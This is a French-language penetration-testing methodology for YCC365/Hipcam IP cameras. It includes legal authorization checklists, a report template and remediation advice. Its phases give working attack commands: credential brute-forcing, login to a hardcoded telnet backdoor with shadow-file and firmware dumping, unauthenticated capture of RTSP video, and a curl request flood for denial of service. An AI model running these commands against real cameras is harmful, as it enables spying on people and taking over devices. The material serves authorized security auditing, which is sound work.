# 🎯 Méthodologie d'Audit YCC365

## Signé Ghost1o1 — Approche Professionnelle

---

## 📜 Engagement & Scope

### Avant tout audit IoT :

```
┌──────────────────────────────────────────────────────────┐
│  ✅ CHECKLIST PRÉ-AUDIT                                  │
├──────────────────────────────────────────────────────────┤
│  □ Autorisation écrite du propriétaire                  │
│  □ Scope IP/MAC défini (CIDR ou liste)                   │
│  □ Fenêtre temporelle négociée                           │
│  □ Rules of engagement (RoE) signées                     │
│  □ Contacts d'urgence identifiés                         │
│  □ Preuve d'achat / facture conservée                   │
└──────────────────────────────────────────────────────────┘
```

### ⚖️ Base Légale

- 🇫🇷 **France** : Code Pénal art. 323-1 à 323-8
- 🇨🇦 **Canada** : Code criminel art. 342.1, Loi PIPEDA
- 🇺🇸 **USA** : CFAA 18 U.S.C. § 1030 + DMCA
- 🇬🇧 **UK** : Computer Misuse Act 1990
- 🇪🇺 **UE** : GDPR (si données personnelles impliquées)

**Sans autorisation écrite = délit pénal.**

---

## 🔍 Phase 0: Préparation

### Identification Cible

```bash
# 1. Trouver le subnet local
ip route | grep default

# 2. Network sweep (ping)
nmap -sn 192.168.1.0/24 -oA network_sweep

# 3. Identifier les IoT devices
nmap -sn 192.168.1.0/24 | grep -iE "(hipcam|ycc|hik|dahua|ipcam|unknown)"
```

### Vérification Vendor

```
Banner HTTP     → grep -i "Server:.*YCC365\|Hipcam\|HiSilicon"
MAC Address     → OUI lookup (00:12:12 = HiSilicon)
mDNS query      → avahi-browse -a | grep -i ycc
ONVIF discovery → curl WS-Discovery Probe
```

---

## 🔍 Phase 1: Reconnaissance Réseau

### Port Scan (depuis script Ghost1o1)

```bash
bash ycc365-ghost.sh
# Option 1: Scanner une IP spécifique
# IP: 192.168.1.100
```

**Ce que ça fait** :
- TCP connect sur 16 ports YCC365/Hipcam
- Détection services ouverts en < 30s

### Analyse Banner

```bash
# HTTP
curl -I http://192.168.1.100/
# Regarder: Server, X-Powered-By, Set-Cookie

# RTSP
curl -X DESCRIBE rtsp://192.168.1.100:554/
# Regarder: Server, CSeq, Public

# ONVIF
curl -X POST http://192.168.1.100:8899/onvif/device_service \
     -H "Content-Type: application/soap+xml" \
     -d '<GetDeviceInformation/>'
```

---

## 🔍 Phase 2: Test Authentification

### HTTP Basic Auth Bruteforce

```bash
# Test manuel avec curl
for cred in "admin:admin" "admin:12345" "root:xmhdipc"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -u "$cred" http://192.168.1.100/)
    echo "$cred → HTTP $code"
done
```

**Codes à connaître** :
- `200` = succès (login OK)
- `401` = échec (cred rejetées)
- `403` = interdit (autre méthode)
- `302` = redirect (vers login ou panel)

### 🔴 Backdoor Telnet (Priorité Critique)

```bash
# Test direct
ncat -nv 192.168.1.100 9527

# À l'invite:
#   login: root
#   Password: xmhdipc
#   → Si OK: shell root, exfiltration immédiate
```

**Si OK** :
1. Capturer `uname -a`, `/etc/passwd`, `/etc/shadow`
2. Hash dump si possible (`cat /etc/passwd`)
3. Firmware extraction (`dd if=/dev/mtdblock0 of=firmware.bin`)
4. Configuration dump
5. Backdoor accounts supplémentaires (`grep xmhdipc /etc/passwd`)

---

## 🔍 Phase 3: Streaming Vidéo

### RTSP Path Enumeration

```bash
# Test chaque chemin
for path in /onvif/streaming/channels/101 /11 /live/ch00_0; do
    echo "Testing rtsp://192.168.1.100:554$path"
    curl -X DESCRIBE "rtsp://192.168.1.100:554$path"
    echo "---"
done
```

### Lecture Sans Auth

```bash
# VLC (CLI)
vlc rtsp://192.168.1.100:554/11 --intf dummy --play-and-exit

# FFmpeg
ffmpeg -rtsp_transport tcp -i "rtsp://192.168.1.100:554/11" -t 30 output.mp4

# Python OpenCV
python3 -c "
import cv2
cap = cv2.VideoCapture('rtsp://192.168.1.100:554/11')
while cap.isOpened():
    ret, frame = cap.read()
    cv2.imwrite('frame.jpg', frame)
    break
"
```

### 🚨 Alerte Critique

Si le flux est accessible **sans aucune authentification**, classifier :

```
CVSS v3.1
Vector:  AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Score:    7.5 (HIGH)

Description:
Le flux RTSP est accessible sans authentification sur le port 554.
Un attaquant sur le même réseau peut visionner la caméra.
```

---

## 🔍 Phase 4: ONVIF Information Disclosure

### Probe SOAP

```bash
POST /onvif/device_service HTTP/1.1
Host: 192.168.1.100:8899
Content-Type: application/soap+xml

<?xml version="1.0" encoding="UTF-8"?>
<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Body>
    <GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/>
  </Body>
</Envelope>
```

### Données Sensibles Exposées

| Field | Risque |
|-------|--------|
| `Manufacturer` | Faible (info publique) |
| `Model` | Faible |
| `FirmwareVersion` | 🟠 **HIGH** — corrélation CVE |
| `SerialNumber` | 🟠 **HIGH** — corrélation base vendor |
| `HardwareId` | 🟠 **HIGH** — device fingerprinting |
| `IPAddress` | Faible (déjà connue) |
| `MacAddress` | 🟡 MED — OUI lookup |

### Denial of Service

```bash
# WS-Discovery flood
for i in {1..1000}; do
    curl -X POST http://192.168.1.100:8899/ -d '<Probe/>' &
done

# Risque: si caméra n'a pas rate-limit → CPU spike, freeze
```

---

## 🔍 Phase 5: Configuration & Persistence

### Si accès shell obtenu (Telnet BD)

```bash
# 1. Identification firmware
uname -a
cat /proc/version
cat /etc/os-release

# 2. Configuration réseau
ifconfig
cat /etc/resolv.conf
cat /etc/hosts

# 3. Services actifs
netstat -tlnp
ps aux

# 4. Credentials hardcodés
grep -r "password\|passwd\|pwd" /etc/
grep -r "admin" /mnt/ /tmp/

# 5. Certificats / clés SSH
find / -name "id_rsa*" 2>/dev/null
ls /etc/ssl/

# 6. Firmware extraction
cat /proc/mtd
dd if=/dev/mtdblock0 of=/tmp/firmware_block0.bin
```

### Web Admin Panel

```bash
# Énumération endpoints
curl http://192.168.1.100:34567/...
curl http://192.168.1.100:34567/cgi-bin/...
curl http://192.168.1.100:8000/api/...

# Backup config download
curl http://192.168.1.100:34567/system/backup
curl http://192.168.1.100:8000/config/export
```

---

## 📊 Rapport d'Audit

### Template Standardisé

```markdown
# Rapport d'Audit YCC365 Plus
**Date** : 2026-06-29
**Auditeur** : Ghost1o1
**Cible** : 192.168.1.100
**Firmware** : V5.0.4 (Manufacturer: HiSilicon)

## Résumé Exécutif

3 vulnérabilités critiques + 2 high découvertes.

## Vulnérabilités

### 🔴 VULN-001: Backdoor Telnet Active
- **CWE**: CWE-798 (Hardcoded Credentials)
- **CVSS v3.1**: 9.8 (CRITICAL)
- **Vector**: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- **Preuve**: Telnet 9527 → root/xmhdipc → shell root
- **Impact**: Compromission totale du device
- **Remédiation**: Bloquer port 9527 firewall + update firmware

### 🟠 VULN-002: RTSP Sans Auth
- **CWE**: CWE-306 (Missing Authentication)
- **CVSS v3.1**: 7.5 (HIGH)
- **Vector**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **Preuve**: curl DESCRIBE rtsp://IP:554/11 → 200 OK
- **Impact**: Visionnage flux vidéo non autorisé
- **Remédiation**: Activer auth RTSP dans config

### 🟠 VULN-003: ONVIF Info Disclosure
- **CWE**: CWE-200 (Information Exposure)
- **CVSS v3.1**: 5.3 (MEDIUM)
- **Vector**: AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
- **Preuve**: SOAP GetDeviceInformation → firmware + serial
- **Impact**: Corrélation CVE facilitée
- **Remédiation**: Restreindre ONVIF aux réseaux de confiance

## Conclusion

Camera NE DOIT PAS rester accessible sur Internet.
Recommandation: VLAN IoT isolé + firewall + firmware V7+.

---
Auditeur: Ghost1o1 🏴‍☠️
Signature numérique présente.
```

---

## 🎯 Remédiation Générique

### Pour un propriétaire YCC365

| Mesure | Implémentation |
|--------|----------------|
| **Changer creds par défaut** | Interface web → Settings → Account |
| **Update firmware** | Settings → System → Update |
| **Désactiver Telnet** | Pas d'option UI → bloquer firewall |
| **Activer auth RTSP** | Settings → Network → RTSP → Auth required |
| **Isoler VLAN IoT** | Routeur → VLAN dédié pour caméras |
| **VPN pour accès distant** | WireGuard/IKEv2 plutôt que port forwarding |
| **Désactiver P2P cloud** | Si pas utilisé → coupe exposition Internet |

---

## 📚 Lectures Professionnelles

- [PTES — Penetration Testing Execution Standard](http://www.pentest-standard.org)
- [OWASP IoT Top 10 2018](https://owasp.org/www-pdf-archive/OWASP-IoT-Top-10-2018.pdf)
- [NIST SP 800-115 — Technical Guide to Information Security Testing](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)
- [IoT Penetration Testing Cookbook — Aaron Guzman](https://www.packtpub.com/product/iot-penetration-testing-cookbook/9781838647453)

---

*Signé Ghost1o1 🏴‍☠️ — Méthodologie v1.0*
